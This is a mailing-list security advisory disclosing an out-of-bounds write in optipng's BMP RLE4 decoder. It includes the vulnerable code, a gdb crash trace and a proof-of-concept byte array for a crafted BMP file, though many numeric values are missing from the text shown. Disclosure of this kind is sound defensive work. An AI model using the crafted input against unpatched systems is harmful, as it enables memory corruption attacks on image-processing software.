  oss-security - optipng: invalid write            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 04 Apr From: Hans Jerry Illikainen <hji@...topia.com> To: bugtraq@...urityfocus.com, fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: optipng: invalid write  An invalid write may occur in optipng before version while processing bitmap images due to `crt_row' being (inc|dec)remented without any boundary checking when encountering delta escapes.  ,---- | static size_t | bmp_read_rows(png_bytepp begin_row, png_bytepp end_row, size_t row_size, |               unsigned int compression, FILE *stream) | { | ... |       crt_row = begin_row; |       for ( ; ; ) |       { |          ch = getc(stream); b1 = (unsigned int)ch; |          ch = getc(stream); b2 = (unsigned int)ch; |          if (ch == EOF) |             break; |          if (b1 == 0)  /* escape */ |          { | ... |             else if (b2 == 2)  /* delta */ |             { |                ch = getc(stream); b1 = (unsigned int)ch;  /* horiz. offset */ |                ch = getc(stream); b2 = (unsigned int)ch;  /* vert. offset */ | ... |                if (b2 > (size_t)((end_row - crt_row) * inc)) |                   b2 = (unsigned int)((end_row - crt_row) * inc); |                for ( ; b2 > 0; --b2) |                { | ... |                   crt_row += inc; | ... |                } | ... |             } |             else  /* b2 >= 3 bytes in absolute mode */ |             { |                len = (b2 <= endn - crtn) ? b2 : (unsigned int)(endn - crtn); |                if (bmp_fread_fn(*crt_row, crtn, len, stream) != len) |                   break; |                crtn += len; |             } |          } | ... | } `----  After `crt_row' has moved OOB, an invalid write may be triggered with `bmp_fread_fn()' in absolute mode:  ,---- | $ gdb --args optipng oob.bmp | (gdb) r |  ** Processing: oob.bmp |  | Program received signal SIGSEGV, Segmentation fault. | __memcpy_sse2 () at | 96  No such file or directory. |  | (gdb) bt | #0  __memcpy_sse2 () at | #1  in __GI__IO_file_xsgetn data=<optimized out>, n=4) at | #2  in __GI__IO_fread (buf=<optimized out>, size=1, count=4, at iofread.c:42 | #3  in bmp_rle4_fread <error: Cannot access memory at address offset=0, len=8, at | #4  in bmp_read_rows row_size=4, compression=2, at | #5  in pngx_read_bmp at | #6  in pngx_read_image fmt_long_name_ptr=0x0) at | #7  in opng_read_file at | #8  in opng_optimize_impl "oob.bmp") at | #9  in opng_optimize "oob.bmp") at | #10 in process_files (argc=2, at | #11 in main (argc=2, at |  | (gdb) x/i $rip | => at mov    %ecx,(%rdi) | (gdb) p/x $ecx | $1 = | (gdb) p/x $rdi | $2 = | (gdb) `----   oob.bmp =======  ,---- | unsigned char bmp[] = { |     /* bmp header */ |     0x4d,             /* BM */ |     /* bmp size */ |                 /* reserved */ |                 /* reserved */ |     0x7a, /* offset */ |  |     /* dib header */ |     0x6c, /* header_size (BITMAPV4HEADER) */ |     /* width */ |     /* height */ |                 /* color planes */ |                 /* bits per pixel */ |     /* compression (RLE4) */ |     /* size of bitmap */ |     /* horizontal resolution */ |     /* vertical resolution */ |     /* number of colors */ |     /* number of important colors */ |     /* red mask */ |     /* green mask */ |     /* blue mask */ |     /* alpha mask */ |     /* color space type */ |     /* x coordinate of red endpoint */ |     /* y coordinate of red endpoint */ |     /* z coordinate of red endpoint */ |     /* x coordinate of green endpoint */ |     /* y coordinate of green endpoint */ |     /* z coordinate of green endpoint */ |     /* x coordinate of blue endpoint */ |     /* y coordinate of blue endpoint */ |     /* z coordinate of blue endpoint */ |     /* red gamma */ |     /* green gamma */ |     /* blue gamma */ |  |     /* |      * delta escape b1, b2 |      * |      * The number of delta escapes required for crt_row to be moved |      * beyond its allocated chunk depends on the image height. |      * |      * b1 is relevant in the last escape if the value at *crt_row is a |      * non-writable address due to: |      * |      * dcrtn = (b1 < endn - crtn) ? (crtn + b1) : endn; |      * [...] |      * for ( ; b2 > 0; --b2) |      * { |      *     [...] |      *     crt_row += inc; |      *     crtn = 0 |      *     [...] |      * } |      * bmp_memset_fn(*crt_row, crtn, 0, dcrtn - crtn); |      * |      * For RLE4-encoded data, bmp_rle4_memset() bails if dcrtn - crtn == 0 |      */ |     0xff, |     0xff, |     0xff, |     0xff, |     0xff, |     0xff, |     0xff, |     0xff, |     0xff, |  |     /* |      * absolute mode followed by the value that's |      * bmp_fread_fn() to *crt_row |      */ |     0xff, | }; `----   Solution ========  This issue has been assigned and is fixed in optipng   --  Hans Jerry Illikainen  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      